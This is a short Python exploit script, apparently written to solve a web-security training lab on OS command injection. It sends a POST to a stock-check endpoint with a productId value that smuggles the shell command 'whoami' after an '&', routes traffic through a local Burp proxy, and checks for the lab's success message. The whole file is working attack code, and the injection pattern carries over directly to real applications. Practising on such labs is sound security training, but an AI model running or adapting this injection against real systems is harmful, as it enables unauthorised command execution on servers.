import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

def exploit(s, url):
    target_url = url + '/product/stock'
    payload = 'productId=1+%26+whoami+%23&storeId=2'
    r = s.post(target_url, data=payload, headers=headers)
    print(r.text)

    r = s.get(url)
    if 'Congratulations, you solved the lab!' in r.text and r.status_code == 200:
        print('[+] Successful solved lab')
    else:
        print('[-] Fail to exploit lab')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    exploit(s, url)
    

if __name__ == '__main__':
    main()